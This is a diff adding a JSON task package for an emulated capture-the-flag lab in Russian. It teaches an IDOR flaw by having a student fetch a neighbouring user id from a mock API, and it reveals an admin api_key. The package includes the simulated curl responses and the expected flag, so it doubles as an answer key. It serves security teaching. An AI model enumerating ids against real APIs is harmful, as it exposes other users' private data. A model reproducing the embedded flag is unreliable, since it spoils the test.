@@ -1,0 +1,37 @@
+{
+  "id": "web-idor-uuid",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: IDOR (горизонтальный доступ)\n\nЦель — `http://vuln.lab.local/api/user/<id>`. API отдаёт профиль по id без\nпроверки, что это «твой» id. Ты — пользователь 1, но объекты чужие тоже видны.\n\n1. Свой профиль: `curl -s http://vuln.lab.local/api/user/1`.\n2. Соседний id: `curl -s http://vuln.lab.local/api/user/2` — профиль админа\n   с полем `api_key` (там флаг).\n3. Достань `cut -d: -f5`, запиши в `found.txt` и набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция vuln.lab.local/api/user)",
+      "cases": [
+        {
+          "match": "api/user/2",
+          "example": "-s http://vuln.lab.local/api/user/2",
+          "output": "{\"id\":2,\"username\":\"admin\",\"email\":\"admin@corp.lab\",\"api_key\":\"nto{1d0r_1n_uuid_l4nd}\"}\n"
+        },
+        {
+          "match": "api/user/1",
+          "example": "-s http://vuln.lab.local/api/user/1",
+          "output": "{\"id\":1,\"username\":\"alice\",\"email\":\"alice@corp.lab\"}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируются только /api/user/1 и /api/user/2 на vuln.lab.local.\n"
+    }
+  },
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{1d0r_1n_uuid_l4nd}"
+  }
+}
